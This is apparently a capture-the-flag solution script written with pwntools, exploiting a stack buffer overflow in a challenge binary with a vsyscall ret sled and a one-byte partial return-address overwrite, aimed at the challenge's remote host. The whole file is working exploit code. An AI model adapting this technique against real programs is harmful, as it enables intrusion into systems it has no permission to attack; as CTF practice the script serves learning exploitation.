#!/usr/bin/python3
from pwn import *

context.log_level = "critical"
context.terminal = ["remotinator", "vsplit", "-x"]

exe = context.binary = ELF("/home/kali/Desktop/chall")
libc = exe.libc

def start(*pargs, **kwargs):
    if args.REMOTE:
        return remote("virtual.ctf.theromanxpl0.it", 7011)
    if args.GDB:
        return exe.debug(gdbscript="b*main+115\ncontinue",  *pargs, **kwargs)
    return exe.process(*pargs, **kwargs)

io = start(env = {"FLAG": r"TRX{example_flag}"})

####### BEGIN #######

"""
0xffffffffff600000 0xffffffffff601000 r-xp     1000      0 [vsyscall]

0xffffffffff600000:  mov    rax,0x60
0xffffffffff600007:  syscall
0xffffffffff600009:  ret
"""

io.recvline()

payload = b"A" * 0x28
payload += p64(0xffffffffff600000) * 2
payload += b"\xa9"

io.send(payload)

io.interactive()